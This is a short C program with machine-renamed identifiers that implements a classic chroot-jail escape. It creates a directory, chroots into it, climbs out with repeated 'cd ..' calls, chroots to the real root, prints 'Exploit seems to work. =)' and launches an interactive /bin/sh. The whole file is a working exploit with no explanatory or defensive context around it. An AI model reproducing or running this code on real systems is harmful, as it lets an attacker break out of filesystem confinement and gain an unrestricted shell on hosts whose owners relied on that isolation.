
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 scalar_t__ FUNC_0 (char*) ;
 scalar_t__ FUNC_1 (char*,int ) ;
 scalar_t__ FUNC_2 (char*) ;
 int FUNC_3 (char*,char*,char*,char*) ;
 int FUNC_4 (int) ;
 scalar_t__ FUNC_5 (char*,int) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (char*) ;

FUNC_8()
{
int VAR_1;

if (FUNC_0("/") != 0) {
  FUNC_6("cd /"); FUNC_4(1);
}
if (FUNC_5("baz", 0777) != 0) {
  FUNC_6("mkdir baz");
}
if (FUNC_2("baz") != 0) {
  FUNC_6("chroot baz"); FUNC_4(1);
}

for (VAR_1=0; VAR_1<50; VAR_1++) {
   if (FUNC_0("..") != 0) {
      FUNC_6("cd ..");
   }
   if (FUNC_1("..", VAR_0) != 0) {
      FUNC_6("chmod");
   }
}
if (FUNC_2(".") != 0) {
  FUNC_6("chroot ."); FUNC_4(1);
}
FUNC_7("Exploit seems to work. =)\n");
FUNC_3("/bin/sh", "sh", "-i", (char *)0);
FUNC_6("exec sh");
FUNC_4(0);
}
